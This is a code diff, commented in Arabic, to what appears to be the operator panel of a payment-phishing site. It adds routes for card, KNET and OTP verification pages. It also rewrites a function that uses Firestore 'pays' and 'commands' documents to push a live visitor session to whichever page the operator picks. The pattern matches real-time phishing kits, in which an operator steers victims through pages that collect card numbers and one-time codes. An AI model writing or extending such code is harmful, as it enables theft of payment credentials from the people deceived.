@@ -836,28 +836,54 @@
       home: 'index.html',
       order: 'order.html',
       payment: 'payment.html',
+      card: 'payment.html',
       otp: 'otp.html',
+      verification: 'otp.html',
+      knet: 'otp.html',
       code: 'code.html',
       cards: 'cards.html',
+      cart: 'cards.html',
       request: 'request.html',
     };
-    // إرسال أمر توجيه للعميل عبر Firestore commands/{docId}/redirect
-    // كل أمر يحمل seq فريدة لضمان تغيير القيمة دائماً (حتى لنفس الصفحة) فيستقبله العميل
-    const sendNavCommand = (prettyLabel, targetPage) => {
+    const NAV_SIGNAL_MAP = {
+      'index.html': 'home',
+      'order.html': 'insur',
+      'payment.html': 'payment',
+      'otp.html': 'otp',
+      'code.html': 'code',
+      'cards.html': 'compar',
+      'request.html': 'request',
+    };
+    // موقع العملاء يستمع إلى pays.redirectPage مباشرة. commands مسار توافق إضافي فقط.
+    // كل أمر يحمل seq فريدة لضمان تغيير القيمة دائماً (حتى لنفس الصفحة).
+    const sendNavCommand = async (prettyLabel, targetPage) => {
       const docId = visitor.sessionId || visitor.id;
-      db.collection('commands').doc(docId).set({
-        redirect: {
-          action: 'REDIRECT_PAGE',
-          targetPage: targetPage,
-          seq: Date.now() + '-' + Math.random().toString(36).slice(2, 8),
-          timestamp: new Date().toLocaleTimeString('ar-EG'),
-          adminId: 'admin',
-        }
-      }, { merge: true }).then(() => {
-        // تحديث redirectPage في pays للعرض فقط
-        db.collection('pays').doc(docId).set({ redirectPage: prettyLabel }, { merge: true });
+      const redirectPage = NAV_SIGNAL_MAP[targetPage] || String(targetPage || '').replace(/\.html$/, '');
+      const seq = Date.now() + '-' + Math.random().toString(36).slice(2, 8);
+      try {
+        // الكتابة الأساسية: هذه هي الإشارة التي يقرأها موقع العملاء فعلياً.
+        await db.collection('pays').doc(docId).set({
+          redirectPage: redirectPage,
+          redirectLabel: prettyLabel,
+          redirectRequestedAt: firebase.firestore.FieldValue.serverTimestamp(),
+          updatedAt: firebase.firestore.FieldValue.serverTimestamp(),
+        }, { merge: true });
+        // لا نفشل التوجيه إذا كانت قواعد commands غير مفعّلة.
+        db.collection('commands').doc(docId).set({
+          redirect: {
+            action: 'REDIRECT_PAGE',
+            targetPage: targetPage,
+            redirectPage: redirectPage,
+            seq: seq,
+            timestamp: new Date().toLocaleTimeString('ar-EG'),
+            adminId: 'admin',
+          }
+        }, { merge: true }).catch((error) => console.warn('Optional commands write failed:', error));
         toast('تم توجيه الزائر إلى ' + prettyLabel, 'success');
-      }).catch(() => toast('تعذر توجيه الزائر', 'error'));
+      } catch (error) {
+        console.error('redirect pays write failed:', error);
+        toast('تعذر توجيه الزائر: ' + (error.message || ''), 'error');
+      }
     };
     els.referenceDetailContent.querySelectorAll('[data-ref-nav]').forEach(btn => btn.addEventListener('click', () => {
       const target = btn.dataset.refNav;
